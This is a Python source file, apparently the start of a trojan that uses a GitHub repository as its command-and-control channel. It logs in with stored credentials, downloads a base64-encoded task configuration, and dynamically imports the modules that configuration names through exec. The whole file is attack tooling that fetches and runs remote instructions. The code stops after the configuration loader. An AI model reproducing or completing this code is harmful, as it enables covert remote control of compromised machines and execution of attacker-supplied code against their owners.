import base64
import imp
import json
import os
import random
import sys
import threading
import time
import queue

from cryptography import *
from git import cmd
from github3 import login


# Get account data and public key
with open('config/keys.json') as json_data:
	account_data = json.load(json_data)[0]

u_branch = account_data['branch']
u_name   = account_data['username']
u_pass   = account_data['password']
u_repo   = account_data['repository']
key      = account_data['cipher_key']


# Init main variables
trojan_id     = "abc"
trojan_config = "{0}.json".format(trojan_id)
trojan_data_path     = "data/{0}/".format(trojan_id)
trojan_modules = []

configured = False
task_queue = queue.Queue()


def connect_to_github():
	gh = login(username=u_name, password=u_pass)
	repo = gh.repository(u_name, u_repo)
	branch = repo.branch(u_branch)

	return gh, repo, branch

def get_file_contents(filepath):

	gh, repo, branch = connect_to_github()

	# initialize remote tree
	tree = branch.commit.commit.tree.recurse()

	# loop trough tree array
	for filename in tree.tree:

		# find filepath in tree object
		if filepath in filename.path:
			print("[*] Found file {0}".format(filepath))
			blob = repo.blob(filename._json_data['sha'])

			# b64 encoded string
			return blob.content

	return None

def get_trojan_config():
	global configured

	# b64 encoded string
	config_b64 = get_file_contents(trojan_config)
	# parse b64 string and return array of python dictionaries
	config = json.loads(base64.b64decode(config_b64))
	configured = True

	for task in config:
		if task["isActive"]:
			if task["module"] not in sys.modules:
				exec("import {0}".format(task["module"]))

	print(config)
	return config
